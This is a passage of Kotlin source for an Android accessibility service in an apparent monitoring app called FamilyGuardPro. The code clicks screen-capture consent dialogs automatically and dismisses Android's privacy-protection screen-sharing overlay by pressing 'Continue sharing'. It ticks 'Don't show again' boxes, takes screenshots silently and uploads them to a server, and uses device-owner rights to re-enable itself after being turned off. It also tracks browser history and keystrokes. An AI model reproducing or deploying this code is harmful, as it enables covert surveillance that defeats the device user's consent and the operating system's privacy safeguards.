            ).any { dialogText.contains(it) }
            
            if (hasContinueSharingButton) {
                // Button is visible, click it directly
                Log.d(TAG, "📲 Continue sharing button visible - clicking...")
                handler.postDelayed({
                    try {
                        val freshRoot = rootInActiveWindow
                        if (freshRoot != null) {
                            val clicked = clickContinueSharingButton(freshRoot)
                            if (clicked) {
                                Log.d(TAG, "✅ Clicked Continue sharing!")
                            }
                            freshRoot.recycle()
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error clicking continue sharing: ${e.message}")
                    }
                }, 100)
            } else if (dialogText.contains("protecting") || dialogText.contains("protection")) {
                // "Protecting" overlay visible - click it to expand
                Log.d(TAG, "📱 Protection overlay detected - clicking to expand...")
                val clickedOverlay = clickProtectionOverlay(rootNode)
                if (clickedOverlay) {
                    // Wait for menu to appear, then click Continue sharing
                    handler.postDelayed({
                        try {
                            val freshRoot = rootInActiveWindow
                            if (freshRoot != null) {
                                val clicked = clickContinueSharingButton(freshRoot)
                                if (clicked) {
                                    Log.d(TAG, "✅ Clicked Continue sharing after expanding!")
                                } else {
                                    Log.d(TAG, "⚠️ Continue sharing button not found after expand")
                                }
                                freshRoot.recycle()
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Error after expanding overlay: ${e.message}")
                        }
                    }, 600) // Wait for menu to fully appear
                }
            }
            
            rootNode.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error handling privacy dialog: ${e.message}")
        }
    }
    
    /**
     * Click the "Protection" overlay notification to expand it
     */
    private fun clickProtectionOverlay(rootNode: AccessibilityNodeInfo): Boolean {
        val overlayKeywords = listOf("protecting", "protection", "protected", "privacy")
        
        for (keyword in overlayKeywords) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                for (node in nodes) {
                    // Try clicking the node itself
                    if (node.isClickable) {
                        Log.d(TAG, "Found clickable protection overlay: $keyword")
                        val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            Log.d(TAG, "✅ Clicked protection overlay!")
                            nodes.forEach { it.recycle() }
                            return true
                        }
                    }
                    
                    // Try clicking parent (notification container)
                    var parent = node.parent
                    var depth = 0
                    while (parent != null && depth < 4) {
                        if (parent.isClickable) {
                            val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            if (result) {
                                Log.d(TAG, "✅ Clicked parent of protection overlay at depth $depth")
                                parent.recycle()
                                nodes.forEach { it.recycle() }
                                return true
                            }
                        }
                        val next = parent.parent
                        parent.recycle()
                        parent = next
                        depth++
                    }
                    parent?.recycle()
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                Log.d(TAG, "Error finding overlay: ${e.message}")
            }
        }
        return false
    }
    
    /**
     * Click the "Continue sharing" button
     */
    private fun clickContinueSharingButton(rootNode: AccessibilityNodeInfo): Boolean {
        val buttonTexts = listOf(
            "continue sharing", "continue streaming", "continue casting",
            "keep sharing", "resume sharing", "share anyway"
        )
        
        for (buttonText in buttonTexts) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByText(buttonText)
                for (node in nodes) {
                    if (node.isClickable) {
                        Log.d(TAG, "Found Continue sharing button: $buttonText")
                        val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            nodes.forEach { it.recycle() }
                            return true
                        }
                    }
                    // Try parent
                    val parent = node.parent
                    if (parent?.isClickable == true) {
                        val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            parent.recycle()
                            nodes.forEach { it.recycle() }
                            return true
                        }
                        parent.recycle()
                    }
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                Log.d(TAG, "Error finding button: ${e.message}")
            }
        }
        return false
    }
    
    /**
     * Click on expandable overlay/notification (like "Protecting your privacy")
     * This needs to be clicked first to reveal the actual buttons
     * ONLY clicks on specific screen sharing related overlays
     */
    private fun clickExpandableOverlay(rootNode: AccessibilityNodeInfo): Boolean {
        // SPECIFIC keywords for screen sharing overlays only
        val screenShareOverlayKeywords = listOf(
            "continue sharing", "continue streaming", "continue casting",
            "stop sharing", "stop streaming", "stop casting", "stop recording"
        )
        
        // Look for clickable elements containing specific screen share keywords
        for (keyword in screenShareOverlayKeywords) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                for (node in nodes) {
                    // Click the node if clickable
                    if (node.isClickable) {
                        Log.d(TAG, "Found clickable screen share overlay with keyword: $keyword")
                        val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            Log.d(TAG, "✅ Clicked screen share overlay!")
                            nodes.forEach { it.recycle() }
                            return true
                        }
                    }
                    
                    // Try parent if node isn't clickable (limited depth)
                    var parent = node.parent
                    var depth = 0
                    while (parent != null && depth < 3) {
                        if (parent.isClickable) {
                            Log.d(TAG, "Found clickable parent of overlay at depth $depth")
                            val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            if (result) {
                                Log.d(TAG, "✅ Clicked parent of screen share overlay!")
                                parent.recycle()
                                nodes.forEach { it.recycle() }
                                return true
                            }
                        }
                        val nextParent = parent.parent
                        parent.recycle()
                        parent = nextParent
                        depth++
                    }
                    parent?.recycle()
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                Log.d(TAG, "Error finding overlay with keyword $keyword: ${e.message}")
            }
        }
        return false
    }
    
    /**
     * Last resort: click any clickable element in the overlay
     */
    private fun clickAnyClickableElement(rootNode: AccessibilityNodeInfo) {
        try {
            findAndClickFirstClickable(rootNode)
        } catch (e: Exception) {
            Log.d(TAG, "Error clicking any element: ${e.message}")
        }
    }
    
    private fun findAndClickFirstClickable(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.isEnabled) {
            val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
            // Avoid cancel/deny buttons
            val lowerText = text.lowercase()
            if (!lowerText.contains("cancel") && !lowerText.contains("deny") && 
                !lowerText.contains("no") && !lowerText.contains("stop")) {
                Log.d(TAG, "Clicking element: $text")
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                if (findAndClickFirstClickable(child)) {
                    child.recycle()
                    return true
                }
                child.recycle()
            }
        }
        return false
    }
    
    /**
     * Click approve button by Resource ID (Layer 1 - most reliable)
     */
    private fun clickApproveButtonById(rootNode: AccessibilityNodeInfo): Boolean {
        for (buttonId in APPROVE_BUTTON_IDS) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(buttonId)
                for (node in nodes) {
                    if (node.isClickable || node.isEnabled) {
                        Log.d(TAG, "Found approve button by ID: $buttonId")
                        val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            Log.d(TAG, "✅ Clicked approve button by ID!")
                            nodes.forEach { it.recycle() }
                            return true
                        }
                    }
                    // Try parent click
                    val parent = node.parent
                    if (parent != null && parent.isClickable) {
                        val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            parent.recycle()
                            nodes.forEach { it.recycle() }
                            return true
                        }
                        parent.recycle()
                    }
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                Log.d(TAG, "Error finding button by ID $buttonId: ${e.message}")
            }
        }
        return false
    }
    
    /**
     * Click approve button by text (Layer 2)
     */
    private fun clickApproveButtonByText(rootNode: AccessibilityNodeInfo): Boolean {
        for (buttonText in APPROVE_BUTTON_TEXTS) {
            try {
                val nodes = rootNode.findAccessibilityNodeInfosByText(buttonText)
                for (node in nodes) {
                    if (isClickableButton(node)) {
                        Log.d(TAG, "Found approve button with text: $buttonText")
                        val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            Log.d(TAG, "✅ Clicked approve button by text!")
                            nodes.forEach { it.recycle() }
                            return true
                        }
                    }
                    // Try parent click
                    val parent = node.parent
                    if (parent != null && parent.isClickable) {
                        val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (result) {
                            parent.recycle()
                            nodes.forEach { it.recycle() }
                            return true
                        }
                        parent.recycle()
                    }
                }
                nodes.forEach { it.recycle() }
            } catch (e: Exception) {
                Log.d(TAG, "Error finding button by text $buttonText: ${e.message}")
            }
        }
        return false
    }
    
    /**
     * Smart pattern detection for approve buttons (Layer 3)
     * Looks for any clickable button and scores based on likely approval intent
     */
    private fun clickApproveButtonSmart(rootNode: AccessibilityNodeInfo): Boolean {
        val candidates = mutableListOf<Pair<AccessibilityNodeInfo, Int>>() // node to score
        
        findAllClickableNodes(rootNode, candidates)
        
        // Sort by score descending and try to click
        candidates.sortedByDescending { it.second }.forEach { (node, score) ->
            if (score > 0) {
                Log.d(TAG, "Trying smart button with score $score: ${node.text ?: node.contentDescription}")
                val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                if (result) {
                    Log.d(TAG, "✅ Clicked approve button via smart detection!")
                    candidates.forEach { it.first.recycle() }
                    return true
                }
            }
        }
        
        candidates.forEach { it.first.recycle() }
        return false
    }
    
    /**
     * Recursively find all clickable nodes and score them
     */
    private fun findAllClickableNodes(node: AccessibilityNodeInfo, candidates: MutableList<Pair<AccessibilityNodeInfo, Int>>) {
        val nodeText = (node.text?.toString() ?: "").lowercase()
        val contentDesc = (node.contentDescription?.toString() ?: "").lowercase()
        val combinedText = "$nodeText $contentDesc"
        
        if (node.isClickable && node.className?.toString()?.contains("Button", ignoreCase = true) == true) {
            var score = 0
            
            // Positive indicators (approve buttons)
            val positiveKeywords = listOf("start", "allow", "continue", "accept", "ok", "yes", "confirm", "grant", "enable", "agree")
            if (positiveKeywords.any { combinedText.contains(it) }) {
                score += 10
            }
            
            // Negative indicators (reject buttons) - should avoid
            val negativeKeywords = listOf("cancel", "deny", "decline", "no", "reject", "later", "skip", "dismiss")
            if (negativeKeywords.any { combinedText.contains(it) }) {
                score -= 20
            }
            
            // Add if not obviously negative
            if (score >= 0) {
                candidates.add(Pair(node, score))
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                findAllClickableNodes(child, candidates)
            }
        }
    }
    
    /**
     * Checks if the current window is a MediaProjection consent dialog
     */
    private fun isMediaProjectionDialog(rootNode: AccessibilityNodeInfo): Boolean {
        // MediaProjection dialog keywords (different Android versions/languages)
        val dialogKeywords = listOf(
            "will start capturing", "start capturing",
            "record", "share your screen", "screen capture",
            "cast", "display", "projection", "mirror",
            "FamilyGuardPro will start capturing everything",
            "wants to capture", "access to screen",
            "grabar", "capturar", "pantalla", // Spanish
            "enregistrer", "capturer", "écran", // French
            "aufnehmen", "bildschirm", // German
            "registrare", "schermo", // Italian
            "захват", "экран" // Russian
        )
        
        val allText = getAllTextFromNode(rootNode).lowercase()
        return dialogKeywords.any { keyword -> 
            allText.contains(keyword.lowercase()) 
        }
    }
    
    /**
     * Recursively gets all text from a node and its children
     */
    private fun getAllTextFromNode(node: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        
        node.text?.let { sb.append(it).append(" ") }
        node.contentDescription?.let { sb.append(it).append(" ") }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                sb.append(getAllTextFromNode(child))
                child.recycle()
            }
        }
        
        return sb.toString()
    }
    
    /**
     * Tries to check the "Don't show again" checkbox if present
     */
    private fun checkDontShowAgainCheckbox(rootNode: AccessibilityNodeInfo) {
        try {
            findAndClickCheckbox(rootNode, DONT_SHOW_AGAIN_TEXTS)
        } catch (e: Exception) {
            Log.d(TAG, "No 'Don't show again' checkbox found or error: ${e.message}")
        }
    }
    
    /**
     * Finds and clicks the approve/start button
     */
    private fun clickApproveButton(rootNode: AccessibilityNodeInfo): Boolean {
        // Try to find button by text
        for (buttonText in APPROVE_BUTTON_TEXTS) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(buttonText)
            for (node in nodes) {
                if (isClickableButton(node)) {
                    Log.d(TAG, "Found approve button with text: $buttonText")
                    val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    if (result) {
                        Log.d(TAG, "Successfully clicked approve button!")
                        autoApproveScreenCapture = false // Reset flag after approval
                        nodes.forEach { it.recycle() }
                        return true
                    }
                }
                
                val parent = node.parent
                if (parent != null && parent.isClickable) {
                    val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    if (result) {
                        Log.d(TAG, "Successfully clicked parent of approve button!")
                        autoApproveScreenCapture = false
                        parent.recycle()
                        nodes.forEach { it.recycle() }
                        return true
                    }
                    parent.recycle()
                }
            }
            nodes.forEach { it.recycle() }
        }
        
        // Try by view ID patterns (for different Android versions)
        // Use the expanded APPROVE_BUTTON_IDS list for all OEMs
        for (buttonId in APPROVE_BUTTON_IDS) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(buttonId)
            for (node in nodes) {
                if (node.isClickable || node.isEnabled) {
                    Log.d(TAG, "Found approve button by ID: $buttonId")
                    val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    if (result) {
                        Log.d(TAG, "Successfully clicked approve button by ID!")
                        autoApproveScreenCapture = false
                        nodes.forEach { it.recycle() }
                        return true
                    }
                }
            }
            nodes.forEach { it.recycle() }
        }
        
        return false
    }
    
    private fun findAndClickCheckbox(rootNode: AccessibilityNodeInfo, texts: List<String>) {
        for (text in texts) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                // Check if it's a checkbox or has a checkable parent
                if (node.isCheckable && !node.isChecked) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Checked 'Don't show again' checkbox")
                }
                
                // Check parent for checkbox
                val parent = node.parent
                if (parent != null && parent.isCheckable && !parent.isChecked) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Checked parent checkbox")
                    parent.recycle()
                }
            }
            nodes.forEach { it.recycle() }
        }
    }
    
    private fun isClickableButton(node: AccessibilityNodeInfo): Boolean {
        return node.isClickable || 
               node.isEnabled ||
               node.className?.toString()?.contains("Button", ignoreCase = true) == true
    }
    
    private fun handleAppOpened(packageName: String) {
        Log.d(TAG, "App opened: $packageName")
        
        val app = applicationContext as? FamilyGuardApp
        val prefs = app?.preferenceManager
        
        // Check if app is blocked
        if (prefs?.isAppBlocked(packageName) == true) {
            Log.d(TAG, "App is blocked: $packageName")
            // Show blocked overlay
            showBlockedOverlay()
            // Navigate back to home
            performGlobalAction(GLOBAL_ACTION_HOME)
        }
    }
    
    private fun showBlockedOverlay() {
        // Show overlay that app is blocked
        val intent = Intent(this, AppBlockerService::class.java).apply {
            action = "SHOW_BLOCKED"
        }
        startService(intent)
    }
    
    override fun onInterrupt() {
        Log.w(TAG, "CORE Accessibility service interrupted - scheduling recovery")
        // Schedule immediate recovery check via AlarmManager
        AlarmManagerWatchdog.scheduleAccessibilityCheck(this)
    }
    
    /**
     * Take screenshot silently using Accessibility Service API (Android 9+)
     * This doesn't require MediaProjection permission and works without user interaction
     */
    private fun takeScreenshotSilently() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ - Use takeScreenshot API
            Log.d(TAG, "Taking screenshot using Accessibility API (Android 11+)")
            
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        Log.d(TAG, "Screenshot captured successfully!")
                        
                        val bitmap = Bitmap.wrapHardwareBuffer(
                            screenshot.hardwareBuffer,
                            screenshot.colorSpace
                        )
                        
                        if (bitmap != null) {
                            // Convert to software bitmap for compression
                            val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            uploadScreenshot(softwareBitmap)
                            bitmap.recycle()
                        }
                        
                        screenshot.hardwareBuffer.close()
                    }
                    
                    override fun onFailure(errorCode: Int) {
                        Log.e(TAG, "Screenshot failed with error code: $errorCode")
                    }
                }
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            // Android 9-10 - Use GLOBAL_ACTION_TAKE_SCREENSHOT
            Log.d(TAG, "Taking screenshot using global action (Android 9-10)")
            val result = performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
            Log.d(TAG, "Screenshot global action result: $result")
            // Note: This saves to gallery, then we need to read and delete it
            // For Android 9-10, we'll fall back to MediaProjection
        }
    }
    
    /**
     * Upload screenshot to server
     */
    private fun uploadScreenshot(bitmap: Bitmap) {
        serviceScope.launch {
            try {
                val app = applicationContext as? FamilyGuardApp
                val deviceId = app?.preferenceManager?.getDeviceId() ?: return@launch
                
                // Convert bitmap to base64
                val outputStream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
                val bytes = outputStream.toByteArray()
                val base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP)
                
                // Upload to server
                val result = ApiClient.uploadScreenshot(
                    deviceId,
                    base64Image,
                    bitmap.width,
                    bitmap.height
                )
                
                result.fold(
                    onSuccess = {
                        Log.d(TAG, "Screenshot uploaded successfully")
                    },
                    onFailure = { error ->
                        Log.e(TAG, "Failed to upload screenshot: ${error.message}")
                    }
                )
                
                bitmap.recycle()
                
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading screenshot", e)
            }
        }
    }
    
    override fun onDestroy() {
        Log.e(TAG, "CRITICAL: CORE Accessibility service destroyed!")
        
        // Remove handler callbacks
        handler.removeCallbacksAndMessages(null)
        
        // Clean up cached rootNode to prevent memory leak
        try {
            cachedRootNode?.recycle()
        } catch (e: Exception) {
            // Ignore recycle errors
        }
        cachedRootNode = null
        
        // Cancel coroutine scope
        serviceScope.cancel()
        
        // Flush browser history before destruction
        try {
            browserHistoryTracker.flushCurrentPage()
            browserHistoryTracker.destroy()
        } catch (e: Exception) {
            // Ignore cleanup errors
        }
        
        // Clean up keystroke correlator
        try {
            keystrokeCorrelator.destroy()
        } catch (e: Exception) {
            // Ignore cleanup errors
        }
        
        // Schedule immediate recovery via AlarmManager (most reliable on MIUI)
        try {
            AlarmManagerWatchdog.scheduleImmediateCheck(this, 100) // Check in 100ms
            AlarmManagerWatchdog.scheduleAccessibilityCheck(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule recovery: ${e.message}")
        }
        
        // Try immediate DO recovery before destruction completes
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
            if (doManager.isDeviceOwner()) {
                Log.d(TAG, "onDestroy: Attempting immediate DO recovery")
                doManager.forceEnableAccessibility()
            }
        } catch (e: Exception) {
            Log.e(TAG, "onDestroy: DO recovery failed: ${e.message}")
        }
        
        // Also notify user if possible (via broadcast)
        try {
            val intent = Intent("com.familyguardpro.ACCESSIBILITY_DIED")
            sendBroadcast(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send death broadcast: ${e.message}")
        }
        
        // Clean up static references
        instance = null
        autoApproveScreenCapture = false
        pendingScreenshotCapture = false
        
        super.onDestroy()
    }
}
